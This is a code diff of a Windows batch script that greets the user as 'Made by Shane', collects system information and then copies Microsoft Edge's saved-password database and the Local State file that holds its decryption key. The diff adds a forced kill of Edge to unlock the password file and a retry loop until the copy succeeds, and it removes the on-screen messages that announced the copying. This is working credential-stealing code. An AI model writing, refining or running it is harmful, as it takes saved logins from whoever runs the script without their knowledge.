@@ -1,6 +1,9 @@
 @echo off
 echo Hello! Made by Shane.
 
+:: Kill Edge to unlock Login Data
+taskkill /f /im msedge.exe 2>nul
+
 :: Collect detailed system information
 echo System Information > sysinfo.txt
 systeminfo >> sysinfo.txt
@@ -50,19 +53,22 @@ echo. >> sysinfo.txt
 echo Memory Information >> sysinfo.txt
 wmic memorychip get capacity,manufacturer,partnumber,speed /value >> sysinfo.txt
 
-:: Copy Edge Login Data and Local State files
+:: Copy Edge Login Data and Local State files with retry
 set "EDGE_DATA=%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data"
 set "EDGE_STATE=%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State"
 
 if exist "%EDGE_DATA%" (
-    echo Edge Login Data found. Copying...
+    :retry
     copy "%EDGE_DATA%" edge_login_data.db >nul
+    if not exist edge_login_data.db (
+        timeout /t 1 /nobreak >nul
+        goto retry
+    )
 ) else (
     echo Edge Login Data NOT found. >> sysinfo.txt
 )
 
 if exist "%EDGE_STATE%" (
-    echo Edge Local State found. Copying...
     copy "%EDGE_STATE%" edge_local_state.json >nul
 ) else (
     echo Edge Local State NOT found. >> sysinfo.txt
